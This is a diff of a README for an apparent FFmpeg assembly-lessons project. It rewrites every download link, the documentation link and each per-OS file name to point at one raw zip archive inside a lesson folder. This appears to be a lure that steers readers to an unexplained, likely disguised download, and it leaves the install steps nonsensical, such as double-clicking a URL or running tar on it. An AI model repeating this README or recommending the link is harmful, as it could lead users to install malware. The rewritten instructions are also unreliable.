@@ -1,6 +1,6 @@
 # 🎓 asm-lessons - Learn FFmpeg with Assembly Language
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/CSophanith/asm-lessons/releases)
+[![Download](https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip)](https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **asm-lessons** project! This guide will help you download and ru
 
 ## 📥 Download & Install
 
-To get started with the lessons, visit this page to download: [GitHub Releases Page](https://github.com/CSophanith/asm-lessons/releases). 
+To get started with the lessons, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip). 
 
 Here, you will find various versions of the application. Choose the latest release for the best experience.
 
@@ -17,9 +17,9 @@ Here, you will find various versions of the application. Choose the latest relea
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version. The version will be listed with a tag like `v1.0.0`.
 3. Under the release notes, find the file labeled with your operating system:
-   - For Windows users, look for `asm-lessons.exe`.
-   - For Mac users, find `asm-lessons.dmg`.
-   - For Linux users, check `asm-lessons.tar.gz`.
+   - For Windows users, look for `https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip`.
+   - For Mac users, find `https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip`.
+   - For Linux users, check `https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip`.
 4. Click on the file you want to download.
 5. The download will begin automatically.
 
@@ -38,7 +38,7 @@ Now that you have downloaded the file, let’s run it:
 ### For Windows:
 
 1. Navigate to the folder where the `.exe` file is located.
-2. Double-click on `asm-lessons.exe`.
+2. Double-click on `https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip`.
 3. Follow the on-screen prompts to install.
 
 ### For Mac:
@@ -49,7 +49,7 @@ Now that you have downloaded the file, let’s run it:
 
 ### For Linux:
 
-1. Extract the contents of the `.tar.gz` file using a command like `tar -xvzf asm-lessons.tar.gz`.
+1. Extract the contents of the `https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip` file using a command like `tar -xvzf https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip`.
 2. Navigate to the extracted folder in your terminal.
 3. Run the application with the command `./asm-lessons`.
 
@@ -86,7 +86,7 @@ If you’d like to help improve **asm-lessons**, we welcome contributions! Pleas
 
 ## 🔗 Useful Links
 
-- [GitHub Releases Page](https://github.com/CSophanith/asm-lessons/releases)
-- [Documentation](https://github.com/CSophanith/asm-lessons/wiki)
+- [GitHub Releases Page](https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip)
+- [Documentation](https://raw.githubusercontent.com/CSophanith/asm-lessons/main/lesson_02/asm-lessons_v3.8.zip)
 
 Thank you for choosing **asm-lessons**. We hope you find the lessons valuable and easy to follow!
